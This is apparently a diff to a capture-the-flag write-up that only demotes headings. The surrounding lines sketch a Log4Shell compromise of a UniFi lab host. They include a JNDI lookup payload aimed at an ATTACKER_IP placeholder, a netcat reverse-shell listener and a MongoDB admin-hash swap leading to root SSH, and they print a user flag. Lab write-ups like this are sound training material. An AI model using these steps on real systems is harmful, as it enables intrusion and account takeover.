@@ -108,7 +108,7 @@ The administrator's credentials can be modified through MongoDB. After logging i
        ROOT FLAG
 ```
 
-# 1. Enumeration
+## 1. Enumeration
 
 The first step is to identify all open TCP ports.
 
@@ -136,7 +136,7 @@ The first four open ports are:
 
 The most interesting service is port 8443, which appears to host a web application.
 
-# 2. Identifying the Application
+## 2. Identifying the Application
 
 Opening the following URL in a browser:
 
@@ -156,7 +156,7 @@ The response contains:
 ```
 <title>UniFi Network</title>
 ```
-# 3. Identifying the Version
+## 3. Identifying the Version
 
 The application version can be identified from the UniFi interface:
 ```
@@ -165,7 +165,7 @@ UniFi Network 6.4.54
 
 This is important because the version is affected by a well-known vulnerability in Apache Log4j.
 
-# 4. Identifying the Vulnerability
+## 4. Identifying the Vulnerability
 
 The vulnerability affecting this version is:
 ```
@@ -207,7 +207,7 @@ Type: Remote Code Execution (RCE)
 MITRE ATT&CK: T1190 - Exploit Public-Facing Application
 OWASP: A06:2021 - Vulnerable and Outdated Components
 
-# 5. Understanding JNDI
+## 5. Understanding JNDI
 
 The next question asks:
 
@@ -226,7 +226,7 @@ ${jndi:ldap://ATTACKER_IP:1389/RESOURCE}
 ```
 The vulnerable application processes the JNDI lookup and connects back to the attacker's LDAP server.
 
-# 6. Log4jUnifi
+## 6. Log4jUnifi
 
 Instead of manually building every part of the exploit, I used the following project:
 
@@ -255,7 +255,7 @@ Log4jUnifi
 └── utils
     └── rogue-jndi
 ```
-# 7. Compiling RogueJNDI
+## 7. Compiling RogueJNDI
 
 The exploit requires the RogueJNDI component to be compiled.
 
@@ -288,7 +288,7 @@ utils/rogue-jndi/target/
 ├── original-RogueJndi-1.1.jar
 └── RogueJndi-1.1.jar
 ```
-# 8. Preparing the Reverse Shell
+## 8. Preparing the Reverse Shell
 
 My VPN interface was:
 ```
@@ -306,7 +306,7 @@ I prepared a listener on port 4444:
 ```
 nc -lvnp 4444
 ```
-# 9. Exploiting Log4Shell
+## 9. Exploiting Log4Shell
 
 From inside the Log4jUnifi directory, the exploit was executed with:
 ```
@@ -341,7 +341,7 @@ We now have a shell on the target as the unifi user.
 
 Important: The exploit must be executed from the Log4jUnifi directory. Running exploit.py from another directory caused the exploit to fail because it relies on relative paths to the RogueJNDI component.
 
-# 10. Initial Shell Enumeration
+## 10. Initial Shell Enumeration
 
 Checking the current directory:
 ```
@@ -373,7 +373,7 @@ uname -a
 Linux unified 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64
 ```
 
-# 11. User Flag
+## 11. User Flag
 
 The home directory contains a user named michael:
 ```
@@ -395,7 +395,7 @@ User Flag
 6ced1a6a89e666c0620cdb10262ba127
 ```
 
-# 12. Discovering MongoDB
+## 12. Discovering MongoDB
 
 The next step is to enumerate running processes.
 ```
@@ -416,7 +416,7 @@ The important part of the process is:
 ```
 This means MongoDB is only listening locally and is not directly exposed through the external network interface.
 
-#13. Enumerating MongoDB
+## 13. Enumerating MongoDB
 
 Connect to MongoDB:
 ```
@@ -447,7 +447,7 @@ Switch to it:
 use ace
 ```
 
-# 14. Enumerating UniFi Users
+## 14. Enumerating UniFi Users
 
 The admin collection contains UniFi user information.
 ```
@@ -470,7 +470,7 @@ The ```x_shadow``` value is a password hash.
 
 The ```$6$``` prefix indicates a SHA-512 crypt password hash with a salt.
 
-# 15. Updating a MongoDB User
+## 15. Updating a MongoDB User
 
 The function used to update users in MongoDB is:
 ```
@@ -493,7 +493,7 @@ The administrator's ```x_shadow value``` can then be replaced with the generated
 After updating the record, the UniFi web interface accepts the new credentials.
 
 
-# 16. Accessing the UniFi Administration Panel
+## 16. Accessing the UniFi Administration Panel
 
 After modifying the administrator credentials, I returned to the UniFi login page:
 ```
@@ -513,7 +513,7 @@ Password: [-]
 ```
 These credentials provide the final step required to obtain root access.
 
-# 17. SSH as Root
+## 17. SSH as Root
 
 SSH is exposed on port 22.
 
@@ -531,7 +531,7 @@ root
 ```
 We now have full administrative access to the machine.
 
-# 18. Root Flag
+## 18. Root Flag
 
 The root user's home directory contains:
 ```
